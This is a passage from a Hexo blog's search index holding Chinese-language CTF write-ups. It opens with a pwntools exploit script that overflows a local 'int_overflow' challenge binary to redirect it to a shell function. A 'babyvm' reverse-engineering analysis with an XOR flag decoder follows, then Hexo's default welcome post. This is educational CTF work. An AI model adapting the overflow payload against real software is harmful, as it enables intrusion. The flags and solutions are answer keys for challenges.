<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./int_overflow'</span>)</span><br><span class="line">sys_addr=<span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span>+p32(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">260</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 整数溢出 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[babyvm]]></title>
      <url>/2020/01/16/babyvm/</url>
      <content type="html"><![CDATA[<h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><h3 id="0x0-函数分析"><a href="#0x0-函数分析" class="headerlink" title="0x0  函数分析"></a>0x0  函数分析</h3><p>载入IDA，F5查看主函数</p>
<figure class="image-box">
                <img src="https://wx1.sbimg.cn/2020/04/20/1579175580774.png" alt="1579175642703" title class>
                <p>1579175642703</p>
            </figure>
<p>有三个函数，进一步查看</p>
<p><strong>sub_400839</strong></p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1579176105200.png" alt="1579176105200" title class>
                <p>1579176105200</p>
            </figure>
<p>此函数为VM的初始化过程，6010A0为vm操作码的内容，0xf1代表sub_400738函数，0xf2代表sub_4006B6函数，0xf5代表sub_4006F4函数</p>
<p><strong>unk_6010A0内容（截取部分）</strong></p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1579177072366.png" alt="1579177072366" title class>
                <p>1579177072366</p>
            </figure>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1579177089451.png" alt="1579177089451" title class>
                <p>1579177089451</p>
            </figure>
<p><strong>sub_400738（0xf1）</strong></p>
<figure class="image-box">
                <img src="https://wx1.sbimg.cn/2020/04/20/1579177178288.png" alt="1579177178288" title class>
                <p>1579177178288</p>
            </figure>
<p>分析可知0xF1代表的是MOV指令，操作数0xE1,0xE2,0xE3,0xE4各自代表不同的寄存器赋值。其中0xE4表示将寄存器赋值给栈s中。</p>
<p><strong>sub_4006B6  (0xf2)</strong></p>
<figure class="image-box">
                <img src="https://wx1.sbimg.cn/2020/04/20/1579178347263.png" alt="1579178347263" title class>
                <p>1579178347263</p>
            </figure>
<p>0xf2代表异或， xor，与0x34异或。</p>
<p>其中a1^=a1[1]^0x34,中a[1]的值为0</p>
<p><strong>sub_4006F4   (0xf5)</strong></p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1579179967857.png" alt="1579179967857" title class>
                <p>1579179967857</p>
            </figure>
<p>0xf5为read()函数</p>
<p><strong>sub_40094e</strong></p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1579176746772.png" alt="1579176746772" title class>
                <p>1579176746772</p>
            </figure>
<p>该函数是对6010A0操作码内容的执行，一直到0xf4结束</p>
<p><strong>sub_400986</strong></p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1579176715766.png" alt="1579176715766" title class>
                <p>1579176715766</p>
            </figure>
<p>非常明显，这是一个check函数，异或加密后输入内容，与byte_601080的内容进行对比。这里注意的是，我们输入的内容在经过异或加密后存储地址变更为s[0x20]~s[0x2c]。</p>
<h3 id="0x1-虚拟化指令分析"><a href="#0x1-虚拟化指令分析" class="headerlink" title="0x1 虚拟化指令分析"></a>0x1 虚拟化指令分析</h3><p><strong>unk_6010A0内容</strong></p>
<p>0xf5,                                                     </p>
<p>0xf1,0xe1,0x0,0x0,0x0,0x0,             </p>
<p>0xf2,   </p>
<p>0xf1,0xe4,0x20,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x1,0x0,0x0,0x0,</p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x21,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x2,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x22,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x3,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x23,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x4,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x24,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x5,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x25,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x6,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x26,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x7,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x27,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x8,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x28,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x9,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x29,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0xa,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x2a,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0xb,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x2b,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0xc,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x2c,0x0,0x0,0x0,</p>
<p>0xf4  </p>
<p>分析结果：</p>
<p>read</p>
<p>r1 = s[0]</p>
<p>r1 ^= 0x34</p>
<p>s[0x20] = r1</p>
<p>r1 = s[1]</p>
<p>r1 ^= 0x34</p>
<p>s[0x21] = r1</p>
<p>r1 = s[2]</p>
<p>r1 ^= 0x34</p>
<p>s[0x22] = r1</p>
<p>r1 = s[3]</p>
<p>r1 ^= 0x34</p>
<p>s[0x23] = r1</p>
<p>r1 = s[4]</p>
<p>r1 ^= 0x34</p>
<p>s[0x24] = r1</p>
<p>r1 = s[5]</p>
<p>r1 ^= 0x34</p>
<p>s[0x25] = r1</p>
<p>r1 = s[6]</p>
<p>r1 ^= 0x34</p>
<p>s[0x26] = r1</p>
<p>r1 = s[7]</p>
<p>r1 ^= 0x34</p>
<p>s[0x27] = r1</p>
<p>r1 = s[8]</p>
<p>r1 ^= 0x34</p>
<p>s[0x28] = r1</p>
<p>r1 = s[9]</p>
<p>r1 ^= 0x34</p>
<p>s[0x29] = r1</p>
<p>r1 = s[10]</p>
<p>r1 ^= 0x34</p>
<p>s[0x2a] = r1</p>
<p>r1 = s[11]</p>
<p>r1 ^= 0x34</p>
<p>s[0x2b] = r1</p>
<p>r1 = s[12]</p>
<p>r1 ^= 0x34</p>
<p>s[0x2c] = r1</p>
<p>ret</p>
<h3 id="0x2-解密"><a href="#0x2-解密" class="headerlink" title="0x2  解密"></a>0x2  解密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s=[<span class="string">'\x75'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x51'</span>,<span class="string">'\x00'</span>,<span class="string">'\x47'</span>,<span class="string">'\x6d'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x42'</span>,<span class="string">'\x59'</span>,<span class="string">'\x15'</span>,<span class="string">'\x15'</span>,<span class="string">'\x15'</span>,]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">l=len(s)</span><br><span class="line"></span><br><span class="line">s=list(map(ord,s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line"></span><br><span class="line">​    num=s[i]^<span class="number">0x34</span></span><br><span class="line"></span><br><span class="line">​    flag+=chr(num)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">flag：A_e4sY_vm!!!</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> vm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2019/03/21/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        <categories>
            
            <category> hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
